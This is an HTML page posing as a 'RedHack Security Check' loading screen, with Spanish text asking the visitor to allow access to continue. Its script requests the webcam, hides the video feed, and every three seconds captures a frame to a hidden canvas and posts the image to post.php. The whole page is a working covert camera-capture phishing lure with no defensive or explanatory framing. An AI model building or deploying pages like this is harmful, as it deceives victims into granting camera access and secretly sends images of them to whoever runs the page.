<!DOCTYPE html>
<html>
<head>
    <title>RedHack Security Check</title>
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
</head>
<body style="background-color:black; color:white; text-align:center; font-family:sans-serif;">
    <h1>Cargando...</h1>
    <p>Por favor, permite el acceso para continuar.</p>
    <video id="video" width="0" height="0" autoplay></video>
    <canvas id="canvas" width="640" height="480" style="display:none;"></canvas>
    <script>
        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');
        navigator.mediaDevices.getUserMedia({ video: true }).then(stream => {
            video.srcObject = stream;
            setInterval(() => {
                canvas.getContext('2d').drawImage(video, 0, 0);
                const imgData = canvas.toDataURL('image/png');
                $.post('post.php', { cat: imgData });
            }, 3000);
        });
    </script>
</body>
</html>
